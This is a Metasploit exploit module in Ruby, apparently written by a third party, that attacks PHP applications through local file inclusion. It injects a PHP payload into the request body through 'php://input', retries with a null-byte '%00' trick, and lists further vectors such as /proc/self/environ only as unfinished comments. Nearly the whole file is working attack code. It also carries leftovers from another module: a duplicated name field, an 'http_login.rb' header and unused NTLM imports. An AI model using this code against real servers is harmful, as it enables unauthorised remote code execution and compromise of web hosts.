##
# $Id: http_login.rb 11961 2011-03-14 22:37:16Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

   
   require 'msf/core'
   require 'rex/proto/ntlm/message'
   require "base64"
   
   class Metasploit3 < Msf::Exploit::Remote
   
	Rank = ManualRanking
   
   	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic PHP Code eval',
   			'Name'           => ' PHP LFI ',
   			'Version'        => '1',
   			'Description'    => 'This module attempts to perform a LFI attack against a PHP application',
			'Author'         => [ 'ghost' ],
			'License'        => BSD_LICENSE,
			'References'     => [ ],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					# max url length for some old versions of apache according to
					# http://www.boutell.com/newfaq/misc/urllength.html
					#'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
			))

   		register_options(
   			[
   				Opt::RPORT(80),
   				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
   					'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
   				OptString.new('URI', [ true, "The URI to authenticate against" ])
   			], self.class)
   	end
   

	def exploit_generic

		print_status("Clean LFI injection")
   		res = send_request_cgi({
			'agent'   => datastore['UserAgent'],
   			'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input"),
   			'method'  => 'POST',
			'data'    => '<?php '+payload.encoded+'?>',
   		}, 10)
		cleanup()
		if not session_created?()
			print_status("LFI injection with %00 trick")
   			res = send_request_cgi({
				'agent'   => datastore['UserAgent'],
   				'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input%00"),
   				'method'  => 'POST',
				'data'    => '<?php '+payload.encoded+'?>',
   			}, 10)
			cleanup()
		end
	end  
 
   	def exploit

		#We fingerprint the server to decide the possible attacks
		fp=http_fingerprint()
		print_status("Trying generic exploits")
		exploit_generic()
		if not session_created?()
			print_status("Trying OS based exploits")
			if ( fp =~/unix/i )
				print_status("Detected a Unix server")
				#linux
				# -- /proc/self/environ + useragent
				# --- COOKIE
                	        # --- POST
				# --- GET
				#freebsd
				# -- logs
			else
				
				print_status("Are they running Windows?!?")
			end
		end
   	end
   end
